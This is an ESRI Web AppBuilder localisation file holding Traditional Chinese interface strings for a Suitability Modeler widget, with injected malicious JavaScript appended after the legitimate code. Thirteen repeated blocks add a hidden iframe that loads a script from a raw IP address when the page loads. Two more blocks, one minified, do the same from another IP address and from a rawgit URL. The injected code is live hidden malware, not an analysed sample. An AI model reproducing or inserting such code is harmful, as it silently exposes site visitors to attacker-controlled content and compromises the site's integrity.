// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"\u9069\u5b9c\u6027\u6a21\u7d44\u5de5\u5177",general:{clear:"\u6e05\u9664",cancel:"\u53d6\u6d88",save:"\u57f7\u884c",saveAs:"\u532f\u51fa"},saveModel:{save:"\u532f\u51fa",title:"\u6a19\u984c: ",summary:"\u6458\u8981: ",description:"\u63cf\u8ff0: ",tags:"\u6a19\u8a18: ",folder:"\u8cc7\u6599\u593e: ",homeFolderPattern:"{username} (Home)",failed:"\u532f\u51fa\u5931\u6557\u3002"},util:{colorRamp:{1:"\u8d85\u4f4e",2:"\u6975\u4f4e",3:"\u4f4e",
4:"\u4e2d\u4f4e",5:"\u4e2d",6:"\u4e2d\u9ad8",7:"\u9ad8",8:"\u6975\u9ad8",9:"\u8d85\u9ad8",low:"\u4f4e",high:"\u9ad8",tipPattern:"{label} ({value})",flipCaption:"\u7ffb\u8f49"}},wro:{caption:"\u9069\u5b9c\u6027\u6a21\u7d44\u5de5\u5177",browsePrompt:"\u52a0\u6b0a\u7684\u758a\u52a0\u670d\u52d9",selectLayersCaption:"\u9078\u64c7\u5716\u5c64",selectLayers:"\u5716\u5c64",designModelCaption:"\u8a2d\u8a08\u6a21\u578b",designModel:"\u8a2d\u8a08\u6a21\u578b",transparency:"\u5e7b\u71c8\u7247",visible:"\u53ef\u898b",
total:"\u7e3d\u8a08",unableToLoad:"\u7121\u6cd5\u8f09\u5165\u6a21\u578b\u3002",projectNotOpen:"\u5c08\u6848\u672a\u958b\u555f\u3002",readMore:"\u95b1\u8b80\u66f4\u591a\u8cc7\u8a0a",validation:{validating:"\u6b63\u5728\u9a57\u8b49...",invalidItemCaption:"\u52a0\u6b0a\u7684\u758a\u52a0\u670d\u52d9\u8b66\u544a",notAnImageService:"\u6b64\u9805\u76ee\u4e0d\u662f\u5716\u7247\u670d\u52d9\u3002",notAWroService:"\u6b64\u9805\u76ee\u4e0d\u662f\u52a0\u6b0a\u7684\u758a\u52a0\u670d\u52d9\u3002",undefinedUrl:"\u6b64\u9805\u76ee\u7684 URL \u672a\u5b9a\u7fa9\u3002",
inaccessible:"\u670d\u52d9\u7121\u6cd5\u5b58\u53d6\u3002",generalError:"\u7121\u6cd5\u6253\u958b\u9805\u76ee\u3002",missingFieldPattern:"{field} \u662f\u5fc5\u8981\u7684\u6b04\u4f4d",notAllowRasterFunction:"allowRasterFunction \u5fc5\u9808\u8a2d\u70ba true",notNearestResampling:"defaultResamplingMethod \u5fc5\u9808\u662f Nearest",notIsWeightedOverlayProp:"\u91d1\u9470\u5c6c\u6027 IsWeightedOverlay \u5fc5\u9808\u8a2d\u70ba true",invalidLink:"URL \u7121\u6548\u3002\u7121\u6cd5\u958b\u555f\u6240\u9078\u5716\u5c64\u7684\u7ad9\u9ede\u3002",
unexpectedError:"\u767c\u751f\u975e\u9810\u671f\u7684\u72c0\u614b\u3002",rangeMessage:"\u503c\u5fc5\u9808\u5728 ${0} \u5230 ${1} \u4e4b\u9593",rangeMessage100:"\u503c\u5fc5\u9808\u5728 0 \u5230 100 \u4e4b\u9593",maxLayers:"\u670d\u52d9\u5141\u8a31\u6700\u591a ${0} \u500b\u5716\u5c64\uff0c\u60a8\u5fc5\u9808\u5148\u79fb\u9664\u5716\u5c64\u624d\u80fd\u65b0\u589e\u3002",notFound:"\u5728\u52a0\u6b0a\u7684\u758a\u52a0\u670d\u52d9\u4e2d\u627e\u4e0d\u5230\u5716\u5c64 ${0}",wroServiceNotDefined:"\u672a\u91dd\u5c0d\u6a21\u578b\u5b9a\u7fa9\u52a0\u6b0a\u7684\u758a\u52a0\u670d\u52d9\u3002",
overlayLayerOutputInvalid:"\u758a\u52a0\u5716\u5c64 [${0}] \u91cd\u65b0\u88fd\u5716\u7bc4\u570d [${1}] \u8f38\u51fa\u503c\u907a\u5931\u6216\u7121\u6548",overlayLayerInputInvalid:"\u758a\u52a0\u5716\u5c64 [${0}] \u91cd\u65b0\u88fd\u5716\u7bc4\u570d [${1}] \u8f38\u5165\u6700\u5c0f\u503c/\u6700\u5927\u503c\u907a\u5931\u6216\u7121\u6548",overlayLayerRangesMissing:"\u758a\u52a0\u5716\u5c64 [${0}] \u7f3a\u5c11\u91cd\u65b0\u88fd\u5716\u7bc4\u570d",overlayLayerWeight:"\u5fc5\u9808\u5c07\u758a\u52a0\u5716\u5c64\u6b0a\u91cd\u65b0\u589e\u81f3\u6700\u9ad8 100",
overlayLayerRequired:"\u81f3\u5c11\u9700\u8981\u4e00\u500b\u758a\u52a0\u5716\u5c64",overlayLayerNotDefined:"\u758a\u52a0\u5716\u5c64\u672a\u5b9a\u7fa9",requiresColormap:"\u6b64\u5149\u67f5\u51fd\u6578\u9700\u8981\u5f69\u8272\u5730\u5716\uff0c\u4f46\u6a21\u578b\u6c92\u6709\u6709\u6548\u7684\u5f69\u8272\u5730\u5716\u5b9a\u7fa9",createModelError:"\u5efa\u7acb\u6a21\u578b\u6642\u51fa\u932f",invalidModel:"\u6a21\u578b\u7121\u6548",imageServiceNotDefined:"\u5716\u7247\u670d\u52d9\u5716\u5c64\u672a\u5b9a\u7fa9",
imageLayerNotDefined:"\u5716\u7247\u670d\u52d9\u5716\u5c64\u672a\u5b9a\u7fa9",histogramNotDefined:"\u672a\u5b9a\u7fa9\u52a0\u6b0a\u7684\u758a\u52a0\u76f4\u65b9\u5716\u51fd\u6578\u3002"},colorRampLabel:{"Green Yellow Red":"\u7da0\u8272\u9ec3\u8272\u7d05\u8272","Red Yellow Green":"\u7d05\u8272\u9ec3\u8272\u7da0\u8272","Yellow to Dark Red":"\u9ec3\u8272\u5230\u6df1\u7d05\u8272","Dark Red to Yellow":"\u6df1\u7d05\u8272\u5230\u9ec3\u8272","Light Gray to Dark Gray":"\u6dfa\u7070\u8272\u5230\u6df1\u7070\u8272",
"Dark Gray to Light Gray":"\u6df1\u7070\u8272\u5230\u6dfa\u7070\u8272","Light Brown to Dark Brown":"\u6dfa\u68d5\u8272\u5230\u6df1\u68d5\u8272","Dark Brown to Light Brown":"\u6df1\u68d5\u8272\u5230\u6dfa\u68d5\u8272","Full Spectrum - Bright Red to Blue":"\u5b8c\u6574\u8272\u8b5c - \u4eae\u7d05\u8272\u5230\u85cd\u8272","Full Spectrum - Bright Blue to Red":"\u5b8c\u6574\u8272\u8b5c - \u4eae\u85cd\u8272\u5230\u7d05\u8272","Partial Spectrum - Yellow to Blue":"\u90e8\u5206\u8272\u8b5c - \u9ec3\u8272\u5230\u85cd\u8272",
"Partial Spectrum - Blue to Yellow":"\u90e8\u5206\u8272\u8b5c - \u85cd\u8272\u5230\u9ec3\u8272","Yellow-Green to Dark Blue":"\u9ec3\u7da0\u8272\u5230\u6df1\u85cd\u8272","Dark Blue to Yellow-Green":"\u6df1\u85cd\u8272\u5230\u9ec3\u7da0\u8272","Cold to Hot Diverging":"\u51b7\u5230\u71b1\u96e2\u6563","Hot to Cold Diverging":"\u71b1\u5230\u51b7\u96e2\u6563","Surface - Low to High":"\u8868\u9762 - \u7531\u4f4e\u81f3\u9ad8","Surface - High to Low":"\u8868\u9762 - \u7531\u9ad8\u81f3\u4f4e"}},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});